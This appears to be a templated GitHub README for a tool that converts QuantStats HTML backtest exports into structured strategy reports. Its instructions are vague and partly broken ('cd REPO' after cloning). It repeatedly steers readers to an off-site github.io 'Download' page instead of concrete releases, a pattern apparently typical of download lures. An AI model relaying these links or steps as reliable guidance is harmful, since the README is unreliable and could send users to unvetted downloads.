# QuantStats Report Generator - Quantitative Strategy Report Generator 2026

> **QuantStats Report Generator converts QuantStats HTML output into organized, readable performance reports featuring chart interpretation, evaluation badges, and independent train/test report views.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/sean-bakercdp5060/quantstats-chart-report-tool?style=flat-square)](https://github.com/sean-bakercdp5060/quantstats-chart-report-tool)

---

<p align="center">
  <a href="https://sean-bakercdp5060.github.io/quantstats-chart-report-tool/">
    <img src="https://img.shields.io/badge/Download-QuantStats%20Report%20Generator%20Latest-brightgreen?style=for-the-badge" alt="Download QuantStats Report Generator">
  </a>
</p>

> **[Download QuantStats Report Generator Latest](https://sean-bakercdp5060.github.io/quantstats-chart-report-tool/)**

---

[Download Latest Build](https://sean-bakercdp5060.github.io/quantstats-chart-report-tool/)

---

## Overview

QuantStats Report Generator provides an automated path from QuantStats HTML exports to structured reports for quantitative strategy assessment. It gathers important performance tables, pulls chart assets from the source HTML, determines the covered reporting periods, and combines the collected material with HTML templates.

Built for quantitative researchers, strategy authors, and analysts, the generator makes backtest review more consistent. Per-chart rule-based commentary, performance status badges, separate training and testing outputs, and PNG contact sheets help organize both detailed analysis and quick visual inspection.

---

## Capabilities

- Retrieves 12 SVG charts from QuantStats HTML reports
- Extracts KPI, end-of-year, and drawdown tables
- Applies rule-based commentary to every extracted chart
- Displays performance-evaluation badges
- Generates independent training and testing reports
- Produces PNG contact sheets for visual verification
- Determines report timeframes automatically
- Renders finished reports using HTML templates

---

## Getting Started

First, download the repository and enter its directory:

```bash
git clone https://github.com/sean-bakercdp5060/quantstats-chart-report-tool.git
cd REPO
```

Then install the dependencies:

```bash
python -m pip install -r requirements.txt
```

Create or obtain a QuantStats HTML export and pass it to the report-generation entry point included in the repository. The launcher name and supported arguments depend on the version of the project that is checked out.

---

## Workflow

The usual report-generation process is:

1. Produce a QuantStats HTML export from a quantitative strategy backtest, or obtain an existing export.
2. Supply that HTML file to QuantStats Report Generator.
3. Allow the generator to determine the report's available timeframe.
4. Extract the charts and KPI-related tables from the document.
5. Review the generated rule-based chart commentary and performance badges.
6. Use the PNG contact sheet to inspect all extracted visuals at a glance.
7. Render the completed report with the provided HTML template.

When development and evaluation periods must be assessed separately, provide one export for training and another for testing. The generator can then create an individual report for each period.

---

## Configuration

The project's HTML templates and related configuration determine how reports are presented and generated. Review the available template files before building a report, then modify the layout or presentation rules as needed for your workflow.

The following illustrates the configuration conceptually:

```yaml
input:
  quantstats_html: path/to/report.html

output:
  report_directory: path/to/output
  contact_sheet: true

analysis:
  rule_based: true
  train_test_reports: false
```

Apply these settings using the configuration syntax supported by the implementation in the current repository version.

---

## Requirements

- A Python runtime
- QuantStats HTML exports for input
- The project's HTML templates
- Enough disk space for extracted SVG files, generated HTML reports, and PNG contact sheets
- Separate training and testing exports when split-period evaluation is needed

---

## Frequently Asked Questions

### Which files can be used as input?

The generator accepts HTML reports exported by QuantStats.

### Which report elements are extracted?

It collects SVG charts plus KPI, end-of-year, and drawdown tables. Under the standard workflow, 12 charts are extracted from each QuantStats HTML export.

### Does it support separate train and test output?

Yes. Training and testing datasets can be handled as separate report sources, allowing each evaluation period to receive its own report.

### What kind of chart interpretation is provided?

The generator applies rule-based analysis to each extracted chart, producing a consistent interpretation of the available visual data.

### How are reports assembled?

The final documents are built from the project's HTML templates. Those templates can be edited when the default structure or presentation does not fit your reporting needs.

### What should I investigate when generation fails?

Verify that the source file is a valid QuantStats HTML export, install all required Python packages, and check that the configured template and output locations exist and are accessible.

### How can I review all extracted charts at once?

Inspect the generated PNG contact sheet, which places the extracted visuals together for a quick sanity check.

### Where can I find updates?

Monitor the repository for new releases, template modifications, and changes to the extraction or analysis process.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
